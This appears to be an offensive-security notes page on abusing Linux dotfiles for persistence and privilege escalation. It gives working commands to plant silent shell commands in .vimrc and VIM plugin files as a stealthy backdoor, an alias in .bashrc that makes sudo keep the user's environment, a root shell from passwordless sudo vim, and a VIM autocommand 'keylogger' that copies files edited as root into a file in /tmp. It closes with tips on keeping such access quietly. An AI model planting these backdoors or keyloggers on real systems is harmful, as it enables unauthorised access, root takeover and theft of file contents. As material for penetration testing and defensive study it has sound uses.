---
title: User Configuration Files
draft: false
tags:
  - post-exploitation
  - offensive
  - linux
  - privesc
  - persistence
---
 
In Linux systems, applications frequently store user-specific configuration files and subdirectories within a user's home directory. These files are often called "[dotfiles](https://wiki.archlinux.org/index.php/Dotfiles)" because they are prepended with a period. The prepended dot character tells the system [not to display these files](https://en.wikipedia.org/wiki/Hidden_file_and_hidden_directory#Unix_and_Unix-like_environments) in basic file listings unless specifically requested by the user.

These configuration files control how applications behave for a specific user and are typically only writable by the user themselves or _root_.

Two common examples of dotfiles are **.bash_profile** and [**.bashrc**](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html):
- **.bash_profile** is executed when logging in to the system initially (via SSH for example)
- **.bashrc** is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.

We can modify **.bash_profile** or **.bashrc** to set environment variables or load scripts when a user initially logs in to a system (persistence).

# VIM Config Simple Backdoor

On many Linux systems, user-specific VIM configuration settings are located in a user's home directory in the [**.vimrc**](https://vim.fandom.com/wiki/Open_vimrc_file) file. This file takes [VIM-specific](https://learnvimscriptthehardway.stevelosh.com/) scripting commands and configures the VIM environment when a user starts the application.

We can execute a command in the .vimrc file or in the vim editor by running:
```bash
:echo "this is a test"

echo ':echo "this is a test"' >> ~/.vimrc
```

> [!Note]
> VIM has access to the [shell environment's variables](http://tldp.org/LDP/abs/html/internalvariables.html)

The commands specified in the **.vimrc** file are executed when VIM is launched. If VIM is not set to use a [restricted environment](https://unix.stackexchange.com/questions/181492/why-is-it-risky-to-give-sudo-vim-access-to-ordinary-users), then we can use it to run shell commands from within the config file or the editor by prepending the _!_ character:
```bash
!touch /tmp/test.txt

$ echo '!touch /tmp/test.txt' >> ~/.vimrc

$ vim XXX
```

> [!Note]
> By default, VIM allows shell commands, but some hardened environments have VIM configured to restrict them. It's possible to test attacks in this VIM environment by calling VIM with the **-Z** parameter on the command line.

Writing directly the commands in the script can be very obvious. We can "source" a shell script using the bash [**source**](https://linuxize.com/post/bash-source-command/) command. This loads a specified shell script and runs it for us during the normal configuration process. Also, we can also "import" other VIM configuration files into the user's current config with the [**:source**](https://stackoverflow.com/questions/803464/how-do-i-source-something-in-my-vimrc-file) command:
```bash
:silent !source ~/.vimrunscript # :silent prevents displaying a warining of the import

echo ":silent !echo 'this is a test'" >> ~/.vimrunscript
echo ":silent !source ~/.vimrunscript" >> ~/.vimrc
$ vim XXX
```

As a stealthier approach, we can leverage the VIM plugin directory. As long as the files have a **.vim** extension, all VIM config files located in the user's **~/.vim/plugin** directory will be loaded when VIM is run:
```bash
$ echo ':silent !echo "this is a test"' >> ~/.vim/plugin/settings.vim
$ vim XXX # triggers the command
```

> [!Note]
> If the user doesnt have a .vimrc file in his home directory, we can create it.

**Privilege Escalation**

We can weaponize this VIM vector to gain root privileges if the user runs VIM as _root_ or uses the [visudo](https://linux.die.net/man/8/visudo) command.

In some systems such as _Ubuntu_ and _Red Hat_, VIM will use the current user's **.vimrc** configuration file even in a sudo context. In other distributions, such as Debian, in a sudo context, VIM will use the _root_ user's VIM configuration.

- When dealing with **Ubuntu, Red Hat, or similar system**, if the user runs VIM via sudo, our script being sourced will also run as _root_. 
- On a **Debian** or similar system that does not utilize the user's shell environment information when moving to a sudo context, we can add an [_alias_](https://en.wikipedia.org/wiki/Alias_\(command\)) to the user's **.bashrc** file to force sudo to persist the user's VIM settings:
```bash
echo 'alias sudo="sudo -E"' >> ~/.bashrc # write it on ~/.bashrc

$ source ~/.bashrc # apply changes
```

Check limited sudo privileges written in the /etc/sudoers file. In this case, we could use the sudo command from below and dont specify any user password:
```
$ sudo -l
...
(root) NOPASSWD: /usr/bin/vim /opt/important.conf
```

Vim will be executed as root, so we can run the following code to gain a root shell automatically:
```bash
$ vim

:shell
```

If a password is required, use the alias vector to gain a backdoor through the imported bash script.

> [!Note]
> Many administrators now require the use of [_sudoedit_](https://linux.die.net/man/8/sudoedit) for modifying sensitive files. This process makes copies of the files for the user to edit and then uses sudo to overwrite the old files. It also prevents the editor itself from running as sudo.

---
# VIM Config Simple Keylogger

VIM allow us to define actions to be performed when various trigger conditions occur using [_autocommands_](http://vimdoc.sourceforge.net/htmldoc/autocmd.html).

> [!Note]
> This allows to bypass a system that uses a restricted VIM environment that blocks any shell commands.

We can use **:autocmd** in a VIM configuration file or in the editor to set actions for a collection of predefined events:
- VimEnter (entering VIM)
- VimLeave (leaving VIM)
- FileAppendPre (right before appending to a file)
- BufWritePost (after writing a change buffer to a file). 

All of these provide different triggers for performing actions that might benefit an attacker.

We could run an autocommand that triggers on the BufWritePost and then writes the content of the file to a log file we specify:
```bash
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt

# Parameters
1. BufWritePost: autocommand trigger
2. *: which files we want it to act on
3. :silent :w! >> /tmp/hackedfromvim.txt: command we want to perform
```

A more specific payload would be to only log files that the user is editing using elevated privileges:
```bash
cat >> ~/.vim/plugin/settings.vim<< EOF
:if \$USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
EOF
```

Place the command in the following file: `~/.vim/plugin/settings.vim`

> [!Note]
> In case there wasnt a restricted environment, we could **run a shell script** instead of saving the buffer to a file by replacing everything after ":silent" with "!" followed by a shell script name or shell command.

---
# Detecting the vector during enumeration

Before weaponizing any dotfile, confirm it is writable by our current user and check whether a higher-privileged user runs the affected application (a classic privesc pivot found by [LinPEAS](https://github.com/carlospolop/PEASS-ng) / linenum):
```bash
# Which dotfiles can the current user write to?
$ ls -la ~ | grep -E '^\.|\s\.'
$ find / -writable -name ".bashrc" -o -name ".vimrc" -o -name ".bash_profile" 2>/dev/null

# Is a privileged user's dotfile world/group-writable? (misconfiguration = privesc)
$ find /root /home -name ".bashrc" -o -name ".vimrc" 2>/dev/null | xargs ls -la 2>/dev/null

# Can we run an editor as root without a password?
$ sudo -l
```

> [!Tip]
> The `.bashrc` / `.bash_profile` alias and export tricks above are also a reliable **persistence** mechanism once you already own a user — no cron or systemd unit required, so they survive reboots quietly. Pair them with the techniques in [[Linux Persistence]].

---
### Related notes
- [[Linux Privilege Escalation]] — parent index; dotfile abuse fits under writable-file / sudo misconfiguration privesc.
- [[Linux Persistence]] — using `.bashrc`/`.vimrc` hooks (and SSH keys, cron) to keep access.
- [[Group Privilege Escalation]] — escalation via group-writable config files and directories.
- [[Known Exploits]] — when dotfile abuse isn't available, fall back to kernel/known-CVE routes.
